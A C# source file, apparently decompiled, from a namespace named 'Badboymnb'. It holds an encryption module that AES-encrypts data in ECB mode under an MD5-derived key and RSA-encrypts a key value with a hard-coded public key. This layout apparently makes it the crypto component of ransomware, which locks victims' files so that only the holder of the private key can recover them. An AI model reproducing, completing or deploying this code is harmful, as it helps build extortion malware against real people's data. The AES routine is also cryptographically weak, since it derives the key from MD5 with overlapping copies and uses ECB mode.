using System;
using System.Security.Cryptography;
using System.Text;

namespace Badboymnb;

internal static class Encryption
{
	public enum KeySizes
	{
		Size2048 = 0x800
	}

	public static byte[] AesEncrypt(byte[] input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	public static string Run()
	{
		byte[] inArray = Encrypt("<RSAKeyValue><Modulus>4wRdzwAxLqj1QrKYtu44+Ei2hHabs1iJhU2cWFP4S/vr6ba+siex2xUh5r5KSTkSZRxXQ7LuKWAkOrK4Ares6aoGzvGk94lvca1kaexrG+VK44FKp953tYx3jUvDwl2fgrABpKfe6S3hDCkJ2I7dXiOQwBEt/d6dBiCFD2vzK00PJzKVHuxYt9hFMOhRk4lWPpLxkNYScC/NUOgqOQjIwFN/M8kqHGAaYqeIr1AA/qbieflL/Vr1pEwb+rhd/UWuQJETsfARn8KFCNaj7mTNcLQzKA08mABQHzgnSE+dsvC795024LhWTifJHXgLtADEowUtCSusPeNI2zsILe1i6Q==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>", Encoding.UTF8.GetBytes(Main.Key));
		return Convert.ToBase64String(inArray);
	}

	private static byte[] Encrypt(string publicKey, byte[] plain)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.PersistKeyInCsp = false;
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(plain, fOAEP: true);
	}
}
